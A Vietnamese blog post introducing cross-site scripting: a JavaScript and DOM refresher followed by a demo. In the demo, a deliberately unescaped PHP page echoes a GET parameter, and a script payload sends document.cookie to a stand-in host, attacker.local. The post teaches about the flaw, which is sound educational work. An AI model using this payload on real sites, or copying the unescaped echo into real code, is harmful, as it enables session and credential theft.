---
layout: post
title: Cross Site Scripting (XSS) [Part 1] - Giới thiệu về lỗi XSS,
date: 2021-05-17 00:32:20 +0700
description: Tìm hiểu về lỗi Cross Site Scripting trên ứng dụng web - P1,
img: 2021/05/17/210517_intro_xss.png
fig-caption: # Add figcaption (optional)
tags: [Security, WebSecurity]
---
Cũng như SQL Injection, XSS cũng được coi là một trong những lỗi phổ biến, có thâm niên lịch sử lâu đời "trong giới securiy" nên chắc là ai cũng nghe qua một lần rồi. Tuy vậy trong loạt bài về Websecurity dù ít hay nhiều cũng phải nhắc tới nó vì trên thực tế mức độ gặp phải nó ***thường xuyên*** chả kém gì SQL Injection là mấy. Ở công ty tôi có chuyên gia lỗi XSS, trong tháng rồi bạn ý cũng đã kiếm được vài ngàn $ dù chỉ focus vào lỗi này (XSS Guy). Nhưng thôi không dài dòng nữa chúng ta bắt đầu nội dung của buổi hôm nay thôi.

## Khởi động,

Vì lỗi này được khai thác ở client site trên nền Javascript nên trước khi bắt đầu tôi nghĩ chúng ta nên điểm lại chút kiến thức về Javascript.

Đầu tiên cần phải hiểu rằng Javascript không phải là Java (Cái này ai cũng biết rồi). Và nó là một  ngôn ngữ thuần hướng đối tượng (Nghĩa là cái gì trong Javascript cũng là đối tượng).

Nội dung bên dưới chỉ điểm qua để nhắc lại. Chi tiết để học tập/tra cứu sẽ sử dụng ở [w3schools.com](https://www.w3schools.com/js/)

#### Javascript được đặt ở đâu trên page
Thông thường trên page có vài vị trí có thể đặt javascript như sau:
* Trong thẻ script
```
<script>
   ....
</script>
```
* Đặt ra file riêng rồi load vào file html
```
<script src="/js/myScript.js"></script> 
```
* Load vào từ url
```
<script src="https://www.w3schools.com/js/myScript.js"></script>
```
* Đặt trong function hoặc khi action event
```
<button onclick="myFunction()">Click me</button>
<img id="id1" src="$imageUrl" onload="javascript:showImage();">
```

#### Khai báo biến và kiểu dữ liệu
Trong javascript nên quên khái niệm kiểu dữ liệu đi (Không cần tập trung vào string, integer, ...)
Khai báo như sau
```
var x;
var x='toan nguyen';
```
Biến ngoài function thì dùng trong phạm vi toàn script. Biến trong function chỉ được dùng trong function

#### Cấu trúc điều khiển
Với if/else
```
if (condition) {
  //  block of code to be executed if the condition is true
} else {
   // block code else
}
```

Cũng có switch
```
switch(expression) {
  case x:
    // code block
    break;
  case y:
    // code block
    break;
  default:
    // code block
}
```
#### Cấu trúc lặp
Với for
```
var i;
for (i = 0; i < cars.length; i++) {
  text += cars[i] + "<br>";
}
```
For in 
```
for (key in object) {
  // code block to be executed
}
```
For of
```
for (variable of iterable) {
  // code block to be executed
}
```
Vẫn có while
```
while (condition) {
  // code block to be executed
}
```

#### Function
Định nghĩa function trong JS như sau:
```
function functionName(args) {
   // Function main code
}
```

#### Event

Event là "things" cái mà xảy ra đối với các HTML elements (Ví dụ như onload trang, click vào một button, hover chuột qua một element bất kỳ, ....). Javascript có thể được kích hoạt dựa trên các HTML events này.

Ví dụ: Tạo 1 button, khi nhấn vào butto này thì hiển thị ngày hiện tại.

```
<html>
   <head>
   </head>
   <body>
       <script>
         function displayDate() {
            var d = new Date();
            window.alert(d.getDate());
         }
       </script>
       <button onclick="displayDate()">Show date</button>
   </body>
</html>
```
Đoạn code trên bắt sự kiện onclick trên button và gọi hàm displayDate() để hiển thị ngày.

#### DOM
* Document Object Model (DOM) - Mô hình tài liệu đối tượng. Là chuẩn cho phép Javascript tự động truy cập update cấu trúc, nội dung hoặc style của page. 

Theo DOM cấu trúc của tài liệu (Document) được tổ chức dạng cây như sau:

![DOM]( {{site.url}}/assets/img/2021/05/17/210517_dom.png){:width="500px"}

Dễ thấy Document được coi như một cây. HTML tag là root. Root có 2 con là HEAD và BODY. Mỗi Item là một child.

* Vừa nói Javascript là ngôn ngữ hướng đối tượng. Mỗi đối tượng có thuộc tính và phương thức. Truy cập thuộc tính theo cú pháp **object.property** và gọi thương thức theo cú pháp **object.method()** 

Ví dụ: đối tượng document có thuộc tính referrer tham chiếu bằng document.referrer. Có method là alert() khi gọi sẽ là document.alert("Demo alert").

* Với DOM ta có thể truy cập, thao tác với bất cứ đối tượng nào trong tài liệu thông qua Javascript một cách dễ dàng.

Ví dụ: Tôi muốn thay đổi action của form rồi sau đó submit form, đối với form ID là 'loginForm' bằng js tôi có thể làm như sau:

```
myForm = document.getElementById("loginForm");
myForm.action = "/custome.php";
myForm.submit();
```

* Method DOM hay dùng

![Method]( {{site.url}}/assets/img/2021/05/17/210517_method.JPG){:width="500px"}

#### Vài snippet code DOM huyền thoại hay dùng như sau:

Hiện alert popup
```
windows.alert("Popup")
```
Redirect
```
window.location.href = 'newPage.html'
```
Lấy cookies
```
document.cookie
```
Change action form
```
form.action = [URL]
```
Submit form
```
form.submit()
```
Tham chiếu tới element bất kỳ theo id
```
document.getElementById("demo");
```
Tham chiếu tới element by class (Trả lại một array)
```
var x = document.getElementsByClassName("example");
```

Hãy bỏ một buổi sáng ra lên w3schools làm theo các hướng dẫn là tôi nghĩ bạn đã khá thành thục javascript rồi.

## Cross Site Scripting là gì?

Cross site scripting (aka XSS): Là kiểu tấn công mà người khai thác chèn các đoạn script độc hại (Thường là Javascript) vào ứng dụng web phía người dùng và trình duyệt sẽ thực thi nó giống như từ trusted site. Kết quả là ứng dụng web sẽ thực hiện các hành động theo ý định của người khai thác.\

Nói thì thật khó hiểu, để đơn giản lấy ví dụ:

Giả sử ta có đoạn code sau:
```
<!DOCTYPE html>
<html>
<head>
   <title></title>
</head>
<body>
   <?php
      setcookie("username", "admin", time()+30*24*60*60);
      setcookie("password", "123qwea@", time()+30*24*60*60);

      if (isset($_GET['name']) && !empty($_GET['name'])) {
         $name = $_GET['name'];
         echo "Welcome $name<br>"; 
      }
   ?>
</body>
</html> 
```
+ Bình thường ta truyền vào name qua biến GET như sau:
```
http://site1.local/tut4/index.php?name=toan
```
Kết quả sẽ trả lại là 

![URL get]( {{site.url}}/assets/img/2021/05/17/210517_url_get.JPG){:width="500px"}

+ Tuy nhiên cải biên một chút ta lại truyền vào như sau:

Payload: 

```
<script>document.write('<img src="http://site1.local/index.php?c='%2bdocument.cookie%2b'" />');</script>
```

URL:

```
http://site1.local/tut4/index.php?name=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://attacker.local/index.php?c=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E
```

Kết quả trả lại sẽ là redirect sang trang 

![URL get2]( {{site.url}}/assets/img/2021/05/17/210517_url_get2.JPG){:width="500px"}

Nhưng khi soi log access của trang attacker.local (URL mà ta truyền vào payload) sẽ thấy

![URL get3]( {{site.url}}/assets/img/2021/05/17/210517_url_get3.JPG){:width="500px"}

Bằng việc khai thác xss đã lấy được toàn bộ dữ liệu cookie của trang web. 

Ví dụ phía trên là một demo nhỏ về cách khai thác và sự nguy hiểm của lỗi XSS. Bài hôm nay khá dài rồi, tôi xin dừng tại đây.


